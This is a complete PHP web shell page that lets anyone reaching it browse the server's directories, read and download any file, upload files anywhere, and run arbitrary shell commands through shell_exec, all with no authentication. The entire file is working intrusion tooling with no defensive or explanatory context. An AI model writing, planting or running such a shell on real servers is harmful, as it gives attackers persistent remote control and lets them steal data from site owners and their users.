<?php
    $current_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
    if (!$current_dir || !is_dir($current_dir)) { $current_dir = getcwd(); }

    // --- VIEW LOGIC ---
    $view_content = "";
    $view_file_name = "";
    if (isset($_GET['view'])) {
        $file_to_view = realpath($_GET['view']);
        if ($file_to_view && file_exists($file_to_view) && is_file($file_to_view)) {
            $view_content = file_get_contents($file_to_view);
            $view_file_name = basename($file_to_view);
        }
    }

    // --- DOWNLOAD LOGIC ---
    if (isset($_GET['download'])) {
        $file_path = realpath($_GET['download']);
        if ($file_path && file_exists($file_path) && is_file($file_path)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
            header('Content-Length: ' . filesize($file_path));
            readfile($file_path);
            exit;
        }
    }

    // --- UPLOAD & COMMAND LOGIC ---
    $msg = "";
    if (isset($_FILES['fileToUpload'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target)) $msg = "Uploaded: " . basename($target);
    }
    $cmd_output = "";
    if (isset($_POST['cmd'])) {
        chdir($current_dir); 
        $cmd_output = shell_exec($_POST['cmd'] . " 2>&1");
    }

    $files = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell - Explorer & Viewer</title>
    <style>
        body { background: #0e0e0e; color: #00ff00; font-family: 'Consolas', 'Courier New', monospace; padding: 20px; }
        a { text-decoration: none; color: #5dade2; }
        a:hover { color: #fff; }
        input, button { background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 5px; }
        
        .breadcrumb { font-size: 1.1em; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .breadcrumb a { color: #00ff00; font-weight: bold; }
        
        /* File Viewer Overlay */
        .viewer-overlay { background: #161616; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; position: relative; }
        .viewer-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; margin-bottom: 10px; padding-bottom: 5px; }
        .viewer-content { max-height: 400px; overflow: auto; background: #000; color: #ddd; padding: 10px; white-space: pre-wrap; font-size: 0.9em; }
        .close-btn { color: #ec7063; font-weight: bold; cursor: pointer; }

        .dir { color: #5dade2; font-weight: bold; }
        .exe { color: #ec7063; font-weight: bold; }
        .file { color: #fdfefe; cursor: pointer; }
        .dl { color: #f4d03f; font-size: 0.8em; margin-left: 10px; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { text-align: left; padding: 10px; color: #666; font-size: 0.9em; }
        td { padding: 6px 10px; border-bottom: 1px solid #1a1a1a; }
        tr:hover { background: #131313; }
    </style>
</head>
<body>

    <div class="breadcrumb">
        Path: 
        <?php 
            $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
            $acc = "";
            foreach ($path_parts as $index => $part) {
                if ($part === "" && $index === 0) { $acc = "/"; echo '<a href="?path=/">/</a>'; }
                else if ($part !== "") {
                    $acc .= (PHP_OS_FAMILY === 'Windows' && $acc != "" ? DIRECTORY_SEPARATOR : ($acc == "/" ? "" : "/")) . $part;
                    echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($part).'</a>/';
                }
            }
        ?>
    </div>

    <!-- File Viewer Section -->
    <?php if ($view_content !== ""): ?>
    <div class="viewer-overlay">
        <div class="viewer-header">
            <span>Viewing: <strong><?php echo htmlspecialchars($view_file_name); ?></strong></span>
            <a href="?path=<?php echo urlencode($current_dir); ?>" class="close-btn">[ X CLOSE ]</a>
        </div>
        <pre class="viewer-content"><?php echo htmlspecialchars($view_content); ?></pre>
    </div>
    <?php endif; ?>

    <div style="margin-bottom: 20px;">
        <form method="POST" enctype="multipart/form-data" style="display:inline;">
            Upload: <input type="file" name="fileToUpload"> <button type="submit">Go</button>
        </form>
        <form method="POST" style="display:inline; margin-left:20px;">
            Exec: <input type="text" name="cmd" placeholder="id" style="width:250px;"> <button type="submit">Run</button>
        </form>
    </div>

    <?php if ($cmd_output): ?><pre style="background:#000; border:1px solid #444; padding:10px;"><?php echo htmlspecialchars($cmd_output); ?></pre><?php endif; ?>

    <table>
        <thead>
            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
        </thead>
        <tbody>
            <?php
            foreach ($files as $file) {
                if ($file == ".") continue;
                $full = $current_dir . DIRECTORY_SEPARATOR . $file;
                $is_dir = is_dir($full);
                $perms = substr(sprintf('%o', fileperms($full)), -4);
                $size = $is_dir ? "-" : round(filesize($full)/1024, 2)."KB";
                
                $path_param = urlencode($full);
                ?>
                <tr>
                    <td>
                        <?php if ($is_dir): ?>
                            <a href="?path=<?php echo $path_param; ?>" class="dir">[DIR] <?php echo htmlspecialchars($file); ?></a>
                        <?php else: ?>
                            <a href="?path=<?php echo urlencode($current_dir); ?>&view=<?php echo $path_param; ?>" class="file"><?php echo htmlspecialchars($file); ?></a>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $size; ?></td>
                    <td><?php echo $perms; ?></td>
                    <td>
                        <?php if (!$is_dir): ?>
                            <a href="?download=<?php echo $path_param; ?>" class="dl">[Download]</a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php
            }
            ?>
        </tbody>
    </table>
</body>
</html>
